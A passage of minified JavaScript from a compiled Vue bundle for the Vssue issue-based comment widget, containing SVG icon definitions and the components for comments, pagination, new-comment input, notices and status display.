0.189 85.9635 5.796 126.252 16.9785 96.201-65.205 138.4425-51.66 138.4425-51.66 27.4365 69.426 10.1745 120.6765 4.9455 133.371 32.319 35.28 51.8805 80.262 51.8805 135.2925 0 193.5675-117.9045 236.187-230.139 248.6925 18.081 15.6555 34.1775 46.305 34.1775 93.3345 0 67.4415-0.5985 121.716-0.5985 138.3165 0 13.419 9.072 29.1375 34.6185 24.192 200.151-66.717 344.3895-255.5595 344.3895-478.17 0-278.3655-225.666-504-504-504z"}})]),e._v(" "),t("symbol",{attrs:{id:"vssue-icon-gitlab",viewBox:"0 0 1024 1024"}},[t("path",{attrs:{d:"M66.61375986 405.11600042L512.11376028 976.03999972 23.84576 621.65599958a39.312 39.312 0 0 1-14.07600042-43.30799944l56.8080007-173.26800028z m259.88400014 0h371.26800014L512.14975986 976.03999972zM215.11376 60.88400042l111.384 344.232H66.61375986l111.384-344.232a19.72800014 19.72800014 0 0 1 37.11600014 0z m742.49999972 344.232l56.8080007 173.2679993a39.23999986 39.23999986 0 0 1-14.07600042 43.30800042l-488.26800028 354.38400014 445.50000042-570.92400028z m0 0h-259.88400014l111.384-344.232a19.72800014 19.72800014 0 0 1 37.11600014 0z"}})]),e._v(" "),t("symbol",{attrs:{id:"vssue-icon-loading",viewBox:"0 0 1024 1024"}},[t("path",{attrs:{d:"M843.307 742.24c0 3.217 2.607 5.824 5.824 5.824s5.824-2.607 5.824-5.824a5.823 5.823 0 0 0-5.824-5.824 5.823 5.823 0 0 0-5.824 5.824zM714.731 874.912c0 6.398 5.186 11.584 11.584 11.584s11.584-5.186 11.584-11.584-5.186-11.584-11.584-11.584-11.584 5.186-11.584 11.584zM541.419 943.2c0 9.614 7.794 17.408 17.408 17.408s17.408-7.794 17.408-17.408-7.794-17.408-17.408-17.408-17.408 7.794-17.408 17.408z m-186.56-9.152c0 12.795 10.373 23.168 23.168 23.168s23.168-10.373 23.168-23.168-10.373-23.168-23.168-23.168-23.168 10.373-23.168 23.168zM189.355 849.12c0 16.012 12.98 28.992 28.992 28.992s28.992-12.98 28.992-28.992-12.98-28.992-28.992-28.992-28.992 12.98-28.992 28.992zM74.731 704.736c0 19.228 15.588 34.816 34.816 34.816s34.816-15.588 34.816-34.816-15.588-34.816-34.816-34.816-34.816 15.588-34.816 34.816z m-43.008-177.28c0 22.41 18.166 40.576 40.576 40.576s40.576-18.166 40.576-40.576-18.166-40.576-40.576-40.576-40.576 18.166-40.576 40.576z m35.392-176.128c0 25.626 20.774 46.4 46.4 46.4s46.4-20.774 46.4-46.4c0-25.626-20.774-46.4-46.4-46.4-25.626 0-46.4 20.774-46.4 46.4z m106.176-142.016c0 28.843 23.381 52.224 52.224 52.224s52.224-23.381 52.224-52.224c0-28.843-23.381-52.224-52.224-52.224-28.843 0-52.224 23.381-52.224 52.224z m155.904-81.344c0 32.024 25.96 57.984 57.984 57.984s57.984-25.96 57.984-57.984-25.96-57.984-57.984-57.984-57.984 25.96-57.984 57.984z m175.104-5.056c0 35.24 28.568 63.808 63.808 63.808s63.808-28.568 63.808-63.808c0-35.24-28.568-63.808-63.808-63.808-35.24 0-63.808 28.568-63.808 63.808z m160.32 72.128c0 38.421 31.147 69.568 69.568 69.568s69.568-31.147 69.568-69.568-31.147-69.568-69.568-69.568-69.568 31.147-69.568 69.568z m113.92 135.488c0 41.638 33.754 75.392 75.392 75.392s75.392-33.754 75.392-75.392-33.754-75.392-75.392-75.392-75.392 33.754-75.392 75.392z m45.312 175.488c0 44.854 36.362 81.216 81.216 81.216s81.216-36.362 81.216-81.216c0-44.854-36.362-81.216-81.216-81.216-44.854 0-81.216 36.362-81.216 81.216z"}})]),e._v(" "),t("symbol",{attrs:{id:"vssue-icon-like",viewBox:"0 0 1024 1024"}},[t("path",{attrs:{d:"M885.9 533.7c16.8-22.2 26.1-49.4 26.1-77.7 0-44.9-25.1-87.4-65.5-111.1a67.67 67.67 0 0 0-34.3-9.3H572.4l6-122.9c1.4-29.7-9.1-57.9-29.5-79.4-20.5-21.5-48.1-33.4-77.9-33.4-52 0-98 35-111.8 85.1l-85.9 311H144c-17.7 0-32 14.3-32 32v364c0 17.7 14.3 32 32 32h601.3c9.2 0 18.2-1.8 26.5-5.4 47.6-20.3 78.3-66.8 78.3-118.4 0-12.6-1.8-25-5.4-37 16.8-22.2 26.1-49.4 26.1-77.7 0-12.6-1.8-25-5.4-37 16.8-22.2 26.1-49.4 26.1-77.7-0.2-12.6-2-25.1-5.6-37.1zM184 852V568h81v284h-81z m636.4-353l-21.9 19 13.9 25.4c4.6 8.4 6.9 17.6 6.9 27.3 0 16.5-7.2 32.2-19.6 43l-21.9 19 13.9 25.4c4.6 8.4 6.9 17.6 6.9 27.3 0 16.5-7.2 32.2-19.6 43l-21.9 19 13.9 25.4c4.6 8.4 6.9 17.6 6.9 27.3 0 22.4-13.2 42.6-33.6 51.8H329V564.8l99.5-360.5c5.2-18.9 22.5-32.2 42.2-32.3 7.6 0 15.1 2.2 21.1 6.7 9.9 7.4 15.2 18.6 14.6 30.5l-9.6 198.4h314.4C829 418.5 840 436.9 840 456c0 16.5-7.2 32.1-19.6 43z"}})]),e._v(" "),t("symbol",{attrs:{id:"vssue-icon-unlike",viewBox:"0 0 1024 1024"}},[t("path",{attrs:{d:"M885.9 490.3c3.6-12 5.4-24.4 5.4-37 0-28.3-9.3-55.5-26.1-77.7 3.6-12 5.4-24.4 5.4-37 0-28.3-9.3-55.5-26.1-77.7 3.6-12 5.4-24.4 5.4-37 0-51.6-30.7-98.1-78.3-118.4-8.3-3.6-17.2-5.4-26.5-5.4H144c-17.7 0-32 14.3-32 32v364c0 17.7 14.3 32 32 32h129.3l85.8 310.8C372.9 889 418.9 924 470.9 924c29.7 0 57.4-11.8 77.9-33.4 20.5-21.5 31-49.7 29.5-79.4l-6-122.9h239.9c12.1 0 23.9-3.2 34.3-9.3 40.4-23.5 65.5-66.1 65.5-111 0-28.3-9.3-55.5-26.1-77.7zM184 456V172h81v284h-81z m627.2 160.4H496.8l9.6 198.4c0.6 11.9-4.7 23.1-14.6 30.5-6.1 4.5-13.6 6.8-21.1 6.7-19.6-0.1-36.9-13.4-42.2-32.3L329 459.2V172h415.4c20.4 9.2 33.6 29.4 33.6 51.8 0 9.7-2.3 18.9-6.9 27.3l-13.9 25.4 21.9 19c12.5 10.8 19.6 26.5 19.6 43 0 9.7-2.3 18.9-6.9 27.3l-13.9 25.4 21.9 19c12.5 10.8 19.6 26.5 19.6 43 0 9.7-2.3 18.9-6.9 27.3l-14 25.5 21.9 19c12.5 10.8 19.6 26.5 19.6 43 0 19.1-11 37.5-28.8 48.4z"}})]),e._v(" "),t("symbol",{attrs:{id:"vssue-icon-heart",viewBox:"0 0 1024 1024"}},[t("path",{attrs:{d:"M923 283.6c-13.4-31.1-32.6-58.9-56.9-82.8-24.3-23.8-52.5-42.4-84-55.5-32.5-13.5-66.9-20.3-102.4-20.3-49.3 0-97.4 13.5-139.2 39-10 6.1-19.5 12.8-28.5 20.1-9-7.3-18.5-14-28.5-20.1-41.8-25.5-89.9-39-139.2-39-35.5 0-69.9 6.8-102.4 20.3-31.4 13-59.7 31.7-84 55.5-24.4 23.9-43.5 51.7-56.9 82.8-13.9 32.3-21 66.6-21 101.9 0 33.3 6.8 68 20.3 103.3 11.3 29.5 27.5 60.1 48.2 91 32.8 48.9 77.9 99.9 133.9 151.6 92.8 85.7 184.7 144.9 188.6 147.3l23.7 15.2c10.5 6.7 24 6.7 34.5 0l23.7-15.2c3.9-2.5 95.7-61.6 188.6-147.3 56-51.7 101.1-102.7 133.9-151.6 20.7-30.9 37-61.5 48.2-91 13.5-35.3 20.3-70 20.3-103.3 0.1-35.3-7-69.6-20.9-101.9zM512 814.8S156 586.7 156 385.5C156 283.6 240.3 201 344.3 201c73.1 0 136.5 40.8 167.7 100.4C543.2 241.8 606.6 201 679.7 201c104 0 188.3 82.6 188.3 184.5 0 201.2-356 429.3-356 429.3z"}})]),e._v(" "),t("symbol",{attrs:{id:"vssue-icon-edit",viewBox:"0 0 1024 1024"}},[t("path",{attrs:{d:"M723.2 917.76H286.72c-65.28 0-118.4-51.2-118.4-113.92V261.76C168.32 198.4 221.44 147.2 286.72 147.2h375.04c17.92 0 32 14.08 32 32s-14.08 32-32 32H286.72c-30.08 0-54.4 22.4-54.4 49.92v542.08c0 27.52 24.32 49.92 54.4 49.92H723.2c30.08 0 54.4-22.4 54.4-49.92V440.32c0-17.92 14.08-32 32-32s32 14.08 32 32v363.52c0 62.72-53.12 113.92-118.4 113.92z"}}),e._v(" "),t("path",{attrs:{d:"M499.84 602.24c-7.68 0-14.72-2.56-21.12-7.68-13.44-11.52-14.72-32-3.2-45.44L780.16 198.4c11.52-13.44 32-14.72 45.44-3.2s14.72 32 3.2 45.44L524.16 591.36c-6.4 7.04-15.36 10.88-24.32 10.88z"}})]),e._v(" "),t("symbol",{attrs:{id:"vssue-icon-delete",viewBox:"0 0 1024 1024"}},[t("path",{attrs:{d:"M677.647059 256l0-90.352941c0-37.436235-23.461647-60.235294-61.771294-60.235294L408.094118 105.411765c-38.249412 0-61.741176 22.799059-61.741176 60.235294l0 90.352941-180.705882 0 0 60.235294 60.235294 0 0 512c0 54.272 33.972706 90.352941 90.352941 90.352941l391.529412 0c55.085176 0 90.352941-33.490824 90.352941-90.352941l0-512 60.235294 0 0-60.235294L677.647059 256zM406.588235 165.647059l210.823529 0-1.264941 90.352941L406.588235 256 406.588235 165.647059zM737.882353 858.352941l-451.764706 0 0-542.117647 451.764706 0L737.882353 858.352941zM466.823529 376.470588l-58.729412 0-1.505882 391.529412 60.235294 0L466.823529 376.470588zM617.411765 376.470588l-60.235294 0 0 391.529412 60.235294 0L617.411765 376.470588z"}})]),e._v(" "),t("symbol",{attrs:{id:"vssue-icon-reply",viewBox:"0 0 1024 1024"}},[t("path",{attrs:{d:"M426.666667 384 426.666667 213.333333 128 512 426.666667 810.666667 426.666667 635.733333C640 635.733333 789.333333 704 896 853.333333 853.333333 640 725.333333 426.666667 426.666667 384Z"}})]),e._v(" "),t("symbol",{attrs:{id:"vssue-icon-error",viewBox:"0 0 1024 1024"}},[t("path",{attrs:{d:"M512 720m-48 0a48 48 0 1 0 96 0 48 48 0 1 0-96 0Z"}}),e._v(" "),t("path",{attrs:{d:"M480 416v184c0 4.4 3.6 8 8 8h48c4.4 0 8-3.6 8-8V416c0-4.4-3.6-8-8-8h-48c-4.4 0-8 3.6-8 8z"}}),e._v(" "),t("path",{attrs:{d:"M955.7 856l-416-720c-6.2-10.7-16.9-16-27.7-16s-21.6 5.3-27.7 16l-416 720C56 877.4 71.4 904 96 904h832c24.6 0 40-26.6 27.7-48z m-783.5-27.9L512 239.9l339.8 588.2H172.2z"}})])])},staticRenderFns:[]},void 0,Ca,void 0,!0,void 0,!1,void 0,void 0,void 0);const Pa=Ta({},void 0,a.a.extend({name:"TransitionFade",functional:!0,props:{group:{type:Boolean,required:!1,default:!1},tag:{type:String,required:!1,default:"div"}},render:(n,{props:e,children:t})=>n(e.group?"TransitionGroup":"Transition",{props:{name:"fade",mode:"out-in",appear:!0,tag:e.tag}},t)}),void 0,void 0,void 0,!1,void 0,void 0,void 0);const Aa=Ta({},void 0,a.a.extend({name:"VssueIcon",functional:!0,props:{name:{type:String,required:!0},title:{type:String,required:!1,default:null}},render:(n,{props:e,data:t})=>n("svg",Object.assign(Object.assign({},t),{class:["vssue-icon","vssue-icon-"+e.name],attrs:{"aria-hidden":"true"}}),[n("title",e.title),n("use",{attrs:{"xlink:href":"#vssue-icon-"+e.name}})])}),void 0,void 0,void 0,!1,void 0,void 0,void 0);let Ea=class extends a.a{constructor(){super(...arguments),this.editMode=!1,this.editContent=this.comment.contentRaw,this.creatingReactions=[],this.isPutingComment=!1,this.isDeletingComment=!1}get currentUser(){return this.vssue.user?this.vssue.user.username:null}get content(){return this.comment.content}get author(){return this.comment.author}get createdAt(){return Ct(this.comment.createdAt)}get updatedAt(){return Ct(this.comment.updatedAt)}get showReactions(){return Boolean(this.vssue.API&&this.vssue.API.platform.meta.reactable&&this.comment.reactions&&!this.editMode)}get reactionKeys(){return["heart","like","unlike"]}get editContentRows(){return this.editContent.split("\n").length-1}get editInputRows(){return this.editContentRows<3?5:this.editContentRows+2}async postReaction({reaction:n}){try{if(this.creatingReactions.includes(n))return;this.creatingReactions.push(n);await this.vssue.postCommentReaction({commentId:this.comment.id,reaction:n})||this.vssue.$emit("error",new Error(this.vssue.$t("reactionGiven",{reaction:this.vssue.$t(n)})));const e=await this.vssue.getCommentReactions({commentId:this.comment.id});e&&(this.comment.reactions=e)}finally{this.creatingReactions.splice(this.creatingReactions.findIndex(e=>e===n),1)}}enterEdit(){this.editMode=!0,this.$nextTick(()=>{this.$refs.input.focus()})}resetEdit(){this.editMode=!1,this.editContent=this.comment.contentRaw}async putComment(){try{if(this.vssue.isPending)return;if(this.editContent!==this.comment.contentRaw){this.isPutingComment=!0,this.vssue.isUpdatingComment=!0;const n=await this.vssue.putComment({commentId:this.comment.id,content:this.editContent});n&&this.vssue.comments.data.splice(this.vssue.comments.data.findIndex(n=>n.id===this.comment.id),1,n)}this.editMode=!1}finally{this.isPutingComment=!1,this.vssue.isUpdatingComment=!1}}async deleteComment(){try{if(this.vssue.isPending)return;if(!window.confirm(this.vssue.$t("deleteConfirm")))return;this.isDeletingComment=!0,this.vssue.isUpdatingComment=!0;await this.vssue.deleteComment({commentId:this.comment.id})?(this.vssue.comments.count-=1,this.vssue.comments.data.length>1&&this.vssue.comments.data.splice(this.vssue.comments.data.findIndex(n=>n.id===this.comment.id),1),this.vssue.query.page>1&&this.vssue.query.page>Math.ceil(this.vssue.comments.count/this.vssue.query.perPage)?this.vssue.query.page-=1:await this.vssue.getComments()):this.vssue.$emit("error",new Error(this.vssue.$t("deleteFailed")))}finally{this.isDeletingComment=!1,this.vssue.isUpdatingComment=!1}}};Sa([ft({type:Object,required:!0})],Ea.prototype,"comment",void 0),Sa([ct()],Ea.prototype,"vssue",void 0),Ea=Sa([lt({components:{VssueIcon:Aa}})],Ea);const _a=Ta({render:function(){var n=this,e=n.$createElement,t=n._self._c||e;return t("div",{staticClass:"vssue-comment",class:{"vssue-comment-edit-mode":n.editMode,"vssue-comment-disabled":n.isDeletingComment||n.isPutingComment}},[t("div",{staticClass:"vssue-comment-avatar"},[t("a",{attrs:{href:n.author.homepage,title:n.author.username,target:"_blank",rel:"noopener noreferrer"}},[t("img",{attrs:{src:n.author.avatar,alt:n.author.username}})])]),n._v(" "),t("div",{staticClass:"vssue-comment-body"},[n._t("body",[t("div",{staticClass:"vssue-comment-header"},[t("span",{staticClass:"vssue-comment-author"},[t("a",{attrs:{href:n.author.homepage,title:n.author.username,target:"_blank",rel:"noopener noreferrer"}},[n._v("\n            "+n._s(n.author.username)+"\n          ")])]),n._v(" "),t("span",{staticClass:"vssue-comment-created-at"},[n._v("\n          "+n._s(n.createdAt)+"\n        ")])]),n._v(" "),t("div",{staticClass:"vssue-comment-main"},[n.editMode?t("textarea",{directives:[{name:"model",rawName:"v-model",value:n.editContent,expression:"editContent"}],ref:"input",staticClass:"vssue-edit-comment-input",attrs:{rows:n.editInputRows},domProps:{value:n.editContent},on:{keyup:function(e){return!e.type.indexOf("key")&&n._k(e.keyCode,"enter",13,e.key,"Enter")?null:e.ctrlKey?n.putComment():null},input:function(e){e.target.composing||(n.editContent=e.target.value)}}}):t("article",{staticClass:"markdown-body",domProps:{innerHTML:n._s(n.content)}})]),n._v(" "),t("div",{staticClass:"vssue-comment-footer"},[n.editMode?t("span",{staticClass:"vssue-comment-hint"},[n._v("\n          "+n._s(n.vssue.$t("editMode"))+"\n        ")]):n._e(),n._v(" "),n.showReactions?t("span",{staticClass:"vssue-comment-reactions"},n._l(n.reactionKeys,(function(e){return t("span",{key:e,staticClass:"vssue-comment-reaction",attrs:{title:n.vssue.$t(n.creatingReactions.includes(e)?"loading":e)},on:{click:function(t){return n.postReaction({reaction:e})}}},[t("VssueIcon",{attrs:{name:n.creatingReactions.includes(e)?"loading":e,title:n.vssue.$t(n.creatingReactions.includes(e)?"loading":e)}}),n._v(" "),t("span",{staticClass:"vssue-comment-reaction-number"},[n._v("\n              "+n._s(n.comment.reactions[e])+"\n            ")])],1)})),0):n._e(),n._v(" "),t("span",{staticClass:"vssue-comment-operations"},[n.comment.author.username===n.currentUser&&n.editMode?t("span",{staticClass:"vssue-comment-operation",class:{"vssue-comment-operation-muted":n.isPutingComment},attrs:{title:n.vssue.$t(n.isPutingComment?"loading":"submit")},on:{click:function(e){return n.putComment()}}},[t("VssueIcon",{directives:[{name:"show",rawName:"v-show",value:n.isPutingComment,expression:"isPutingComment"}],attrs:{name:"loading",title:n.vssue.$t("loading")}}),n._v("\n\n            "+n._s(n.vssue.$t("submit"))+"\n          ")],1):n._e(),n._v(" "),n.comment.author.username===n.currentUser&&n.editMode?t("span",{staticClass:"vssue-comment-operation vssue-comment-operation-muted",attrs:{title:n.vssue.$t("cancel")},on:{click:function(e){return n.resetEdit()}}},[n._v("\n            "+n._s(n.vssue.$t("cancel"))+"\n          ")]):n._e(),n._v(" "),n.comment.author.username===n.currentUser?t("span",{directives:[{name:"show",rawName:"v-show",value:!n.editMode,expression:"!editMode"}],staticClass:"vssue-comment-operation",on:{click:function(e){return n.enterEdit()}}},[t("VssueIcon",{attrs:{name:"edit",title:n.vssue.$t("edit")}})],1):n._e(),n._v(" "),n.comment.author.username===n.currentUser||n.vssue.isAdmin?t("span",{directives:[{name:"show",rawName:"v-show",value:!n.editMode,expression:"!editMode"}],staticClass:"vssue-comment-operation",on:{click:function(e){return n.deleteComment()}}},[t("VssueIcon",{attrs:{name:n.isDeletingComment?"loading":"delete",title:n.vssue.$t(n.isDeletingComment?"loading":"delete")}})],1):n._e(),n._v(" "),t("span",{directives:[{name:"show",rawName:"v-show",value:!n.editMode,expression:"!editMode"}],staticClass:"vssue-comment-operation",on:{click:function(e){return n.vssue.$emit("reply-comment",n.comment)}}},[t("VssueIcon",{attrs:{name:"reply",title:n.vssue.$t("reply")}})],1)])])])],2)])},staticRenderFns:[]},void 0,Ea,void 0,!1,void 0,!1,void 0,void 0,void 0);let Ba=class extends a.a{get disabled(){return this.vssue.isPending}get pageCount(){const n=Math.ceil(this.vssue.comments.count/this.vssue.comments.perPage);return n>1?n:1}get perPageOptions(){const n=[5,10,20,50];return!n.includes(this.vssue.options.perPage)&&this.vssue.options.perPage<100&&n.push(this.vssue.options.perPage),n.sort((n,e)=>n-e)}get page(){return this.vssue.query.page>this.pageCount?this.pageCount:this.vssue.query.page}set page(n){n>0&&n<=this.pageCount&&(this.vssue.query.page=n)}get perPage(){return this.vssue.query.perPage}set perPage(n){this.perPageOptions.includes(n)&&(this.vssue.query.perPage=n)}};Sa([ct()],Ba.prototype,"vssue",void 0),Ba=Sa([lt({components:{VssueIcon:Aa}})],Ba);const Ia=Ta({render:function(){var n=this,e=n.$createElement,t=n._self._c||e;return t("div",{staticClass:"vssue-pagination"},[t("div",{staticClass:"vssue-pagination-per-page"},[t("label",[t("select",{directives:[{name:"model",rawName:"v-model",value:n.perPage,expression:"perPage"}],staticClass:"vssue-pagination-select",attrs:{disabled:n.disabled},on:{change:function(e){var t=Array.prototype.filter.call(e.target.options,(function(n){return n.selected})).map((function(n){return"_value"in n?n._value:n.value}));n.perPage=e.target.multiple?t:t[0]}}},n._l(n.perPageOptions,(function(e){return t("option",{key:e,domProps:{value:e}},[n._v("\n          "+n._s(e)+"\n        ")])})),0),n._v(" "),t("span",[n._v("\n        "+n._s(n.vssue.$t("perPage"))+"\n      ")])]),n._v(" "),n.vssue.API.platform.meta.sortable?t("span",{class:{"vssue-pagination-link":!0,disabled:n.disabled},attrs:{title:n.vssue.$t("sort")},on:{click:function(e){n.vssue.query.sort="asc"===n.vssue.query.sort?"desc":"asc"}}},[n._v("\n      "+n._s("asc"===n.vssue.query.sort?"↑":"↓")+"\n    ")]):n._e()]),n._v(" "),t("div",{staticClass:"vssue-pagination-page"},[t("span",{class:{"vssue-pagination-link":!0,disabled:1===n.page||n.disabled},attrs:{title:n.vssue.$t("prev")},domProps:{textContent:n._s("<")},on:{click:function(e){n.page-=1}}}),n._v(" "),t("label",[t("span",[n._v("\n        "+n._s(n.vssue.$t("page"))+"\n      ")]),n._v(" "),t("select",{directives:[{name:"show",rawName:"v-show",value:n.pageCount>1,expression:"pageCount > 1"},{name:"model",rawName:"v-model",value:n.page,expression:"page"}],staticClass:"vssue-pagination-select",attrs:{disabled:n.disabled},on:{change:function(e){var t=Array.prototype.filter.call(e.target.options,(function(n){return n.selected})).map((function(n){return"_value"in n?n._value:n.value}));n.page=e.target.multiple?t:t[0]}}},n._l(n.pageCount,(function(e){return t("option",{key:e,domProps:{value:e}},[n._v("\n          "+n._s(e)+"\n        ")])})),0),n._v(" "),t("span",{directives:[{name:"show",rawName:"v-show",value:n.pageCount<2,expression:"pageCount < 2"}],domProps:{textContent:n._s(n.page)}}),n._v(" "),t("span",{domProps:{textContent:n._s(" / "+n.pageCount+" ")}})]),n._v(" "),t("span",{class:{"vssue-pagination-link":!0,disabled:n.page===n.pageCount||n.disabled},attrs:{title:n.vssue.$t("next")},domProps:{textContent:n._s(">")},on:{click:function(e){n.page+=1}}})])])},staticRenderFns:[]},void 0,Ba,void 0,!1,void 0,!1,void 0,void 0,void 0);let za=class extends a.a{};Sa([ct()],za.prototype,"vssue",void 0),za=Sa([lt({components:{TransitionFade:Pa,VssueComment:_a,VssuePagination:Ia}})],za);const Da=Ta({render:function(){var n=this.$createElement,e=this._self._c||n;return e("div",{staticClass:"vssue-comments"},[e("VssuePagination"),this._v(" "),e("TransitionFade",{attrs:{group:""}},this._l(this.vssue.comments.data,(function(n){return e("VssueComment",{key:n.id,attrs:{comment:n}})})),1),this._v(" "),e("VssuePagination",{directives:[{name:"show",rawName:"v-show",value:this.vssue.comments.data.length>5,expression:"vssue.comments.data.length > 5"}]})],1)},staticRenderFns:[]},void 0,za,void 0,!1,void 0,!1,void 0,void 0,void 0);const Fa=Ta({},void 0,a.a.extend({name:"VssueIcon",functional:!0,props:{type:{type:String,required:!1,default:"default"}},render:(n,{props:e,data:t,children:a})=>n("button",Object.assign(Object.assign({},t),{class:["vssue-button","vssue-button-"+e.type]}),a)}),void 0,void 0,void 0,!1,void 0,void 0,void 0);let Oa=class extends a.a{constructor(){super(...arguments),this.content=""}get user(){return this.vssue.user}get platform(){return this.vssue.API&&this.vssue.API.platform.name}get isInputDisabled(){return this.loading||null===this.user||null===this.vssue.issue}get isSubmitDisabled(){return""===this.content||this.vssue.isPending||null===this.vssue.issue}get loading(){return this.vssue.isCreatingComment}get contentRows(){return this.content.split("\n").length-1}get inputRows(){return this.contentRows<3?5:this.contentRows+2}created(){this.vssue.$on("reply-comment",n=>{const e=n.contentRaw.replace(/\n/g,"\n> "),t=`@${n.author.username}\n\n> ${e}\n\n`;this.content=this.content.concat(t),this.focus()})}beforeDestroy(){this.vssue.$off("reply-comment")}focus(){this.$refs.input.focus()}async submit(){this.isSubmitDisabled||(await this.vssue.postComment({content:this.content}),this.content="",await this.vssue.getComments())}};Sa([ct()],Oa.prototype,"vssue",void 0),Oa=Sa([lt({components:{VssueButton:Fa,VssueIcon:Aa}})],Oa);const La=Ta({render:function(){var n=this,e=n.$createElement,t=n._self._c||e;return t("div",{staticClass:"vssue-new-comment"},[t("div",{staticClass:"vssue-comment-avatar"},[n.user?t("a",{attrs:{href:n.user.homepage,title:n.user.username,target:"_blank",rel:"noopener noreferrer"}},[t("img",{attrs:{src:n.user.avatar,alt:n.user.username}})]):t("VssueIcon",{attrs:{name:n.platform.toLowerCase(),title:n.vssue.$t("loginToComment",{platform:n.platform})},on:{click:function(e){return n.vssue.login()}}})],1),n._v(" "),t("div",{staticClass:"vssue-new-comment-body"},[t("textarea",{directives:[{name:"model",rawName:"v-model",value:n.content,expression:"content"}],ref:"input",staticClass:"vssue-new-comment-input",attrs:{rows:n.inputRows,disabled:n.isInputDisabled,placeholder:n.vssue.$t(n.user?"placeholder":"noLoginPlaceHolder"),spellcheck:!1,"aria-label":"leave a comment"},domProps:{value:n.content},on:{keyup:function(e){return!e.type.indexOf("key")&&n._k(e.keyCode,"enter",13,e.key,"Enter")?null:e.ctrlKey?n.submit():null},input:function(e){e.target.composing||(n.content=e.target.value)}}})]),n._v(" "),t("div",{staticClass:"vssue-new-comment-footer"},[n.user?t("span",{staticClass:"vssue-current-user"},[t("span",[n._v(n._s(n.vssue.$t("currentUser"))+" - "+n._s(n.user.username)+" - ")]),n._v(" "),t("a",{staticClass:"vssue-logout",on:{click:function(e){return n.vssue.logout()}}},[n._v("\n        "+n._s(n.vssue.$t("logout"))+"\n      ")])]):t("span",{staticClass:"vssue-current-user"},[n._v("\n      "+n._s(n.vssue.$t("loginToComment",{platform:n.platform}))+"\n    ")]),n._v(" "),t("div",{staticClass:"vssue-new-comment-operations"},[n.user?t("VssueButton",{staticClass:"vssue-button-submit-comment",attrs:{type:"primary",disabled:n.isSubmitDisabled},on:{click:function(e){return n.submit()}}},[t("VssueIcon",{directives:[{name:"show",rawName:"v-show",value:n.loading,expression:"loading"}],attrs:{name:"loading"}}),n._v("\n\n        "+n._s(n.vssue.$t(n.loading?"submitting":"submitComment"))+"\n      ")],1):t("VssueButton",{staticClass:"vssue-button-login",attrs:{type:"primary",title:n.vssue.$t("loginToComment",{platform:n.platform})},on:{click:function(e){return n.vssue.login()}}},[n._v("\n        "+n._s(n.vssue.$t("login",{platform:n.platform}))+"\n      ")])],1)])])},staticRenderFns:[]},void 0,Oa,void 0,!1,void 0,!1,void 0,void 0,void 0);let Ma=class extends a.a{constructor(){super(...arguments),this.progress={show:!1,percent:0,timer:null,speed:200},this.alert={show:!1,message:null,timer:null}}onLoadingCommentsChange(n){this.vssue.comments&&(n?this.progressStart():this.progressDone())}created(){this.vssue.$on("error",n=>this.alertShow(n.message))}beforeDestroy(){this.vssue.$off("error"),null!==this.progress.timer&&window.clearTimeout(this.progress.timer),null!==this.alert.timer&&window.clearTimeout(this.alert.timer)}progressStart(){this.progress.show=!0,this.progress.percent=0,this.progress.timer=window.setInterval(()=>{this.progress.percent+=5,this.progress.percent>94&&null!==this.progress.timer&&window.clearInterval(this.progress.timer)},this.progress.speed)}progressDone(){this.progress.percent=100,null!==this.progress.timer&&window.clearTimeout(this.progress.timer),this.progress.timer=null,window.setTimeout(()=>{this.progress.show=!1},this.progress.speed)}alertShow(n){this.alert.show=!0,this.alert.message=n,null!==this.alert.timer&&window.clearTimeout(this.alert.timer),this.alert.timer=window.setTimeout(()=>{this.alertHide()},3e3)}alertHide(){this.alert.show=!1,null!==this.alert.timer&&window.clearTimeout(this.alert.timer),this.alert.timer=null}};Sa([ct()],Ma.prototype,"vssue",void 0),Sa([bt("vssue.isLoadingComments")],Ma.prototype,"onLoadingCommentsChange",null),Ma=Sa([lt({components:{TransitionFade:Pa}})],Ma);const Na=Ta({render:function(){var n=this,e=n.$createElement,t=n._self._c||e;return t("div",{staticClass:"vssue-notice"},[t("div",{directives:[{name:"show",rawName:"v-show",value:n.progress.show,expression:"progress.show"}],staticClass:"vssue-progress",style:{width:n.progress.percent+"%",transition:"all "+n.progress.speed+"ms linear"}}),n._v(" "),t("TransitionFade",[t("div",{directives:[{name:"show",rawName:"v-show",value:n.alert.show,expression:"alert.show"}],staticClass:"vssue-alert",domProps:{textContent:n._s(n.alert.message)},on:{click:function(e){return n.alertHide()}}})])],1)},staticRenderFns:[]},void 0,Ma,void 0,!1,void 0,!1,void 0,void 0,void 0);let Ra=class extends a.a{get status(){return this.vssue.isFailed?"failed":this.vssue.isInitializing?"initializing":this.vssue.isIssueNotCreated&&!this.vssue.isCreatingIssue?this.vssue.isAdmin||!this.vssue.isLogined?"issueNotCreated":"failed":this.vssue.isLoginRequired?"loginRequired":!this.vssue.comments||this.vssue.isCreatingIssue?"loadingComments":0===this.vssue.comments.data.length?"noComments":null}handleClick(){"issueNotCreated"===this.status?this.vssue.postIssue():"loginRequired"===this.status&&this.vssue.login()}};Sa([ct()],Ra.prototype,"vssue",void 0),Ra=Sa([lt({components:{TransitionFade:Pa,VssueIcon:Aa}})],Ra);const qa=Ta({render:function(){var n=this,e=n.$createElement,t=n._self._c||e;return t("TransitionFade",[n.status?t("div",{key:n.status,staticClass:"vssue-status"},[["failed","loadingComments","initializing"].includes(n.status)?t("VssueIcon",{attrs:{name:"failed"===n.status?"error":"loading"}}):n._e(),n._v(" "),t("p",{staticClass:"vssue-status-info"},[t(["issueNotCreated","loginRequired"].includes(n.status)?"a":"span",{tag:"Component",on:{click:n.handleClick}},[n._v("\n        "+n._s(n.vssue.$t(n.status))+"\n      ")])],1)],1):n._e()])},staticRenderFns:[]},void 0,Ra,void 0,!1,void 0,!1,void 0,void 0,void 0);let Ua=class extends a.a{};Sa([ct()],Ua.prototype,"vssue",void 0),Ua=Sa([lt({components:{TransitionFade:Pa,VssueIcon:Aa,VssueComments:Da,VssueNewComment:La,VssueNotice:Na,VssueStatus:qa}})],Ua);const $a=Ta({render:function(){var n=this.$createElement,e=this._self._c||n;return e("TransitionFade",[this.vssue.isInitializing?e("VssueStatus"):e("div",{staticClass:"vssue-body"},[this.vssue.API?e("VssueNewComment"):this._e(),this._v(" "),e("VssueNotice"),this._v(" "),e("TransitionFade",[this.vssue.comments&&this.vssue.comments.data.length>0?e("VssueComments"):e("VssueStatus")],1)],1)],1)},staticRenderFns:[]},void 0,Ua,void 0,!1,void 0,!1,void 0,void 0,void 0);let Wa=class extends a.a{};Sa([ct()],Wa.prototype,"vssue",void 0),Wa=Sa([lt],Wa);const Ha=Ta({render:function(){var 